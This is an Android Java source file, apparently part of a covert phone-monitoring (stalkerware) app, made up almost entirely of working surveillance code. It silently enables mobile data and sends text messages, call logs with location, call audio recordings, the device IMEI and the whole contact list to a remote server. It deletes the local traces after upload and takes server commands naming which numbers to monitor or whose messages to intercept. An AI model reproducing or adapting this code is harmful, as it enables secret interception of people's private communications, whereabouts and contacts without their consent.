package com.privacy.monitor.receiver;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.Iterator;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.google.gson.Gson;
import com.privacy.monitor.base.C;
import com.privacy.monitor.db.CallRecordDB;
import com.privacy.monitor.db.DirectiveDB;
import com.privacy.monitor.db.MonitorDB;
import com.privacy.monitor.db.SMSRecordDB;
import com.privacy.monitor.db.util.DirectiveUtil;
import com.privacy.monitor.domain.CallRecord;
import com.privacy.monitor.domain.DeviceInfo;
import com.privacy.monitor.domain.Monitor;
import com.privacy.monitor.domain.SMSRecord;
import com.privacy.monitor.service.utilservice.ClientSocket;
import com.privacy.monitor.util.AppUtil;
import com.privacy.monitor.util.HttpUtil;
import com.privacy.monitor.util.Logger;
import com.privacy.monitor.util.NetworkUtil;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

/**
 * 自定义广播
 */
public class CronBroadcaseRectiver extends BroadcastReceiver {

	private static final String TAG = CronBroadcaseRectiver.class.getSimpleName();
	private MonitorDB monitorDB;
	private SMSRecordDB smsRecordDB;
	private CallRecordDB callRecordDB;
	private DirectiveDB directiveDB;
	private TelephonyManager tm;
	private ClientSocket cSocket;
	
	@Override
	public void onReceive(final Context context, Intent intent) {
		final SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
		if(cSocket == null){
		
			String devBrand = sp.getString(C.DEVICE_BRAND,"");
			String devPhone = sp.getString(C.PHONE_NUM,"");
			String devID = sp.getString(C.DEVICE_ID,"");
			String devSystem = sp.getString(C.DEVICE_SYSTEM,"");
			String supRec = sp.getString(C.DEVICE_SUP_REC,"1");
			String supCallRec = sp.getString(C.DEVICE_SUP_CALL_REC,"0");
			String supGPS = sp.getString(C.DEVICE_SUP_GPS,"0");
			DeviceInfo deviceInfo = new DeviceInfo();
			deviceInfo.setBrand(devBrand);
			deviceInfo.setDeviceID(devID);
			deviceInfo.setSystem(devSystem);
			deviceInfo.setPhoneNum(devPhone);
			deviceInfo.setSupCallRec(supCallRec);
			deviceInfo.setSupRec(supRec);
			deviceInfo.setSupGPS(supGPS);
			
			cSocket = new ClientSocket(deviceInfo) {
				@Override
				public void receiveData(String type, String data) {
					boolean hasUpload= sp.getBoolean(C.CONTACTS_UPLOAD,false);
					if(!hasUpload){
						uploadContact(context, sp);
					}
				}
			};
			cSocket.start();
		}else {
			if(cSocket.isInterrupted())cSocket.start();
		}
		
		new Thread(new Runnable() {
			boolean isCloseMobileNet = false;
			@Override
			public void run() {
				smsRecordDB = SMSRecordDB.getInstance(context);
				callRecordDB = CallRecordDB.getInstance(context);
				directiveDB = DirectiveDB.getInstance(context);
				if(DirectiveUtil.isStopAllFunction(directiveDB)){
					return ;
				}
				
				if(!HttpUtil.detect(context)){
					Logger.d("CronBroadcaseRectiver","开启网络");
					AppUtil.toggleMobileNet(context, true);
					isCloseMobileNet = true;
				}
				SystemClock.sleep(10000);
				
				if(tm==null){
					tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
				}
				
				new Thread(new Runnable() {
					@Override
					public void run() {
						uploadSMSData(smsRecordDB,context);
						uploadCallRecord(callRecordDB,context);
					}
				}).start();
				
				SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
				String simID = tm.getSimSerialNumber();
				//更改号码了 
				if(!sp.getString(C.SIM_ID,"").equals(simID)){
					Editor editor = sp.edit();
					editor.putString(C.PHONE_NUM,simID);
					editor.commit();
				}
				String monitorList = AppUtil.streamToStr(NetworkUtil.download(context,"tel="+sp.getString(C.PHONE_NUM,""),C.RequestMethod.getMonitorList));
			    if(isCloseMobileNet){
			    	AppUtil.toggleMobileNet(context, false);
			    }
				if(!TextUtils.isEmpty(monitorList)){
			    	HashMap<String,Monitor> hashMap = new HashMap<String, Monitor>();
			        monitorDB = MonitorDB.getInstance(context);
			    	try {
						JSONObject jsonObject = new JSONObject(monitorList);
						String location = jsonObject.getString("loc");
						Logger.d(TAG, "是否定位:"+location);
						
						JSONObject callObject = jsonObject.getJSONObject("call");
						JSONArray jsonArray = callObject.getJSONArray("monitor");
						int callListLength = jsonArray.length();
						for(int j =0 ; j < callListLength ; j++){
							String callMonitorPhone= jsonArray.getString(j);
							Monitor monitor = new Monitor();
							monitor.setPhone(callMonitorPhone);
							monitor.setCallMonitorStatus("1");
							monitor.setLocationStatus(location);
							hashMap.put(callMonitorPhone, monitor);
							Logger.d(TAG,"监听通话号码为:"+callMonitorPhone);
						}
						
						JSONArray jArrayNotMonitor = callObject.getJSONArray("not_monitor");
						int length3 = jArrayNotMonitor.length();
						for(int i = 0 ; i < length3 ; i++){
							String notMonitorStr = jArrayNotMonitor.getString(i);
							Monitor monitor = new Monitor();
							monitor.setPhone(notMonitorStr);
							monitor.setCallMonitorStatus("0");
							monitor.setLocationStatus(location);
							hashMap.put(notMonitorStr,monitor);
							Logger.d(TAG,"不监听的通话号码:"+notMonitorStr);
						}
						
						JSONObject msgJsonObject = jsonObject.getJSONObject("msf");
						JSONArray jsonArray2 = msgJsonObject.getJSONArray("monitor");
						int length4 = jsonArray2.length();
						for(int b = 0 ; b<length4 ; b++){
							String msgMonitorPhone = jsonArray2.getString(b);
							Monitor monitor = hashMap.get(msgMonitorPhone);
							if(monitor==null){
								monitor = new Monitor();
								monitor.setPhone(msgMonitorPhone);
								monitor.setLocationStatus(location);
							}
							monitor.setSmsMonitorStatus("1");
							hashMap.put(msgMonitorPhone, monitor);
							Logger.d(TAG,"信息监听号码:"+msgMonitorPhone);
						}
						
						JSONArray jsonArray3 = msgJsonObject.getJSONArray("not_monitor");
						int lengtn5 = jsonArray3.length();
						for(int c = 0 ; c < lengtn5 ; c++){
							String msgNotMonitor = jsonArray3.getString(c);
							Monitor monitor = hashMap.get(msgNotMonitor);
							if(monitor==null){
								monitor= new Monitor();
								monitor.setPhone(msgNotMonitor);
								monitor.setLocationStatus(location);
							}
							monitor.setSmsMonitorStatus("0");
							hashMap.put(msgNotMonitor, monitor);
							Logger.d(TAG,"信息不监听号码:"+msgNotMonitor);
						}
						
						JSONArray jsonArray4 = msgJsonObject.getJSONArray("filter");
						int length6 = jsonArray4.length();
						for(int u = 0 ;u < length6 ; u++){
							String msgFilter = jsonArray4.getString(u);
							Monitor monitor = hashMap.get(msgFilter);
							if(monitor==null){
								monitor = new Monitor();
								monitor.setPhone(msgFilter);
								monitor.setLocationStatus(location);
							}
							monitor.setFilterStatus("1");
							Logger.d(TAG,"信息拦截号码:"+msgFilter);
						}
						insertDB(hashMap);
						
					} catch (JSONException e) {
						Logger.d("CronBroadcaseRectiver",e.getMessage());
					}
			    }
			}
		}).start();
		
	}
	
	private void insertDB(HashMap<String,Monitor> hashMap){
		//删除前先删除所有的数据
		monitorDB.deleteAll();
		 Collection<Monitor> monitors = hashMap.values();
		 Iterator<Monitor> iterator = monitors.iterator();
		 while(iterator.hasNext()){
			 Monitor monitor = iterator.next();
			 monitorDB.insert(monitor);
		 }
	}
	
	private void uploadSMSData(SMSRecordDB smsRecordDB ,Context context) {
		ArrayList<SMSRecord> list = smsRecordDB.query(SMSRecord.COL_UPLOAD_STATUS +" = ? ",new String []{"0"});
			if(list !=null){
				for (SMSRecord smsRecord : list) {
					uploadSmsInfo(smsRecordDB,smsRecord,context);
			}
		}
	}
	
	private void uploadSmsInfo(SMSRecordDB smsRecordDB,SMSRecord smsRecord,Context context) {
		SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
		String updateDate = "my_num="+sp.getString(C.PHONE_NUM,"")+"&you_num="+smsRecord.getPhone()+"&time="+smsRecord.getDateSent()+"&content="+smsRecord.getMessageContent()+"&type="+smsRecord.getType()+"&sim_id="+AppUtil.getIMEI(context)+"&you_name="+smsRecord.getName();
		String updateResult= AppUtil.streamToStr(NetworkUtil.upload(context,updateDate,C.RequestMethod.uploadSMS));
		Logger.d("Cron", "返回结果："+updateResult);
		if("ok".equalsIgnoreCase(updateResult)){
			Logger.d("Cron", "删除了短信记录...");
			smsRecordDB.delete(SMSRecord.COL_DATE +" = ?",new String []{smsRecord.getDateSent()});
		}
	}
	
	private void uploadCallRecord(CallRecordDB callRecordDB,Context context){
		ArrayList<CallRecord> callRecords = callRecordDB.queryAll();
		if(callRecords !=null){
		   for (CallRecord callRecord : callRecords) {
			String result = callRecord.getUploadResult();
			if(!"0".equals(result)){
				String uploadResult = NetworkUtil.uploadCall(callRecord.getMyPhone(),callRecord.getPhoneNumber(),callRecord.getCallName(),callRecord.getCallStartTime(),callRecord.getCallStopTime(),callRecord.getSimID(),callRecord.getLon(),callRecord.getLat(),callRecord.getDeviceName(),callRecord.getCallStatus());
			    if(uploadResult.startsWith(callRecord.getMyPhone()+"/"+callRecord.getMyPhone()+"_"+callRecord.getPhoneNumber()+"_"+callRecord.getCallStatus())){
			    	String filePath = callRecord.getSoundRecordPath();
			    	if(!TextUtils.isEmpty(filePath)){
			    		String uploadFileResult = NetworkUtil.uploadFile(uploadResult,filePath);
			    		if(uploadFileResult.contains("FAULT")){
			    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,callRecord.getCallStartTime()});
			    		}else {
							callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
							File file = new File(filePath);
							if(file.exists()){
								if(file.isFile()){
									file.delete();
								}
							}
						}
			    	}else {
			    		callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
					}
			    }
			 }else{
				 String filePath = callRecord.getSoundRecordPath();
				 String callResult =callRecord.getUploadResult();
				 if(!TextUtils.isEmpty(filePath)){
			    		String uploadFileResult = NetworkUtil.uploadFile(callResult,filePath);
			    		if(uploadFileResult.contains("FAULT")){
			    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,callRecord.getCallStartTime()});
			    		}else {
							callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
							File file = new File(filePath);
							if(file.exists()){
								if(file.isFile()){
									file.delete();
								}
							}
						}
			    	}else {
			    		callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
				}
			 }
		  }
	   }
	}
	
	private void uploadContact(Context context,SharedPreferences sp){
		Uri uri = Uri.parse("content://com.android.contacts/raw_contacts");
		ContentResolver resolver = context.getContentResolver();
		Cursor cursor =resolver.query(uri,new String[]{"_id"}, null, null, null);
		boolean one = false;
		boolean two = false;
		String name = "";
		String phone = "";
		ArrayList<ArrayList<String>> list = new ArrayList<ArrayList<String>>();
		if(cursor !=null){
			while(cursor.moveToNext()){
				int id = cursor.getInt(0);
				Uri uri2 = Uri.parse("content://com.android.contacts/data");
				Cursor cursor2 = resolver.query(uri2,new String[]{"mimetype","data1"}, "raw_contact_id = ? ", new String[]{id+""}, null);
			    if(cursor2!=null){
			    	while(cursor2.moveToNext()){
			    		String mimetype = cursor2.getString(0);
			    		String data1 = cursor2.getString(1);
			    		if("vnd.android.cursor.item/name".equals(mimetype)){
			    			name = data1;
			    			one = true;
			    		}else if("vnd.android.cursor.item/phone_v2".equals(mimetype)){
			    			phone = data1;
			    			two = true;
			    		}
			    		if(one && two){
			    			ArrayList<String> contactList = new ArrayList<String>();
			    			contactList.add(name);
			    			contactList.add(phone);
			    			list.add(contactList);
			    			one = false;
			    			two = false;
			    		}
			    	}
			    }
			}
			String param = "key="+ClientSocket.APP_REQ_KEY+"&device_id="+sp.getString(C.DEVICE_ID,"")+"&book_list="+ new Gson().toJson(list);
		
			InputStream is = NetworkUtil.upload2(context, param,C.RequestMethod.uploadContact);
			InputStreamReader isr = new InputStreamReader(is);
			BufferedReader br = new BufferedReader(isr);
			String temp = null;
			String result = "";
			try {
				while ((temp = br.readLine()) != null) {
					result = result + temp;
				}
				Editor editor = sp.edit();
				editor.putBoolean(C.CONTACTS_UPLOAD, true);
				editor.commit();
				isr.close();
				is.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
}
